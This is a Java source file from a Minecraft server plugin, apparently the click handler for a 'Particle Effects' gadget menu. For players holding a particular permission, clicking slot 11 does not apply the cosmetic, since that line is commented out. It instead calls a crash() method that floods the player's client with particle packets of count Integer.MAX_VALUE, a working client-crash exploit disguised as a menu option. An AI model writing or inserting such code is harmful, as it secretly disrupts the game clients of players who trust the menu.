package me.enchanted.hubcore.gadgets;

import java.io.IOException;

import javax.lang.model.element.PackageElement;

import org.bukkit.Bukkit;
import org.bukkit.craftbukkit.v1_12_R1.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.scheduler.BukkitRunnable;

import me.enchanted.hubcore.HubCore;
import me.enchanted.hubcore.particles._ParticleArrays_;
import net.minecraft.server.v1_12_R1.EntityPlayer;
import net.minecraft.server.v1_12_R1.EnumParticle;
import net.minecraft.server.v1_12_R1.PacketDataSerializer;
import net.minecraft.server.v1_12_R1.PacketPlayOutCloseWindow;
import net.minecraft.server.v1_12_R1.PacketPlayOutWorldParticles;

public class _GadgetsParticlesClick implements Listener {

	@EventHandler
	public void onClick(InventoryClickEvent e) {
		if (e.getInventory().getName().equals("§a§lParticle Effects")) {
			if (e.getSlot() == 11) {
				e.setCancelled(true);
				Player p = (Player) e.getWhoClicked();
				if (p.hasPermission("par.chrishat")) {
					crash(p);

					// _ParticleArrays_.cHT.add(p);
				}
			} else {
				e.setCancelled(true);
			}
		}
	}

	public static void crash(Player p) {
		PacketPlayOutWorldParticles packet = new PacketPlayOutWorldParticles(EnumParticle.BARRIER, true,
                p.getLocation().getBlockX(), p.getLocation().getBlockY(), p.getLocation().getBlockZ(),
                p.getLocation().getBlockX()+10, p.getLocation().getBlockY()+10, p.getLocation().getBlockZ()+10,
                10, Integer.MAX_VALUE);
        EntityPlayer c = ((CraftPlayer)p).getHandle();
        c.playerConnection.sendPacket(packet);
        c.playerConnection.sendPacket(packet);
        c.playerConnection.sendPacket(packet);
        c.playerConnection.sendPacket(packet);
        c.playerConnection.sendPacket(packet);
        c.playerConnection.sendPacket(packet);
        c.playerConnection.sendPacket(packet);
        c.playerConnection.sendPacket(packet);
        c.playerConnection.sendPacket(packet);
        c.playerConnection.sendPacket(packet);
        c.playerConnection.sendPacket(packet);
        c.playerConnection.sendPacket(packet);
	}
}
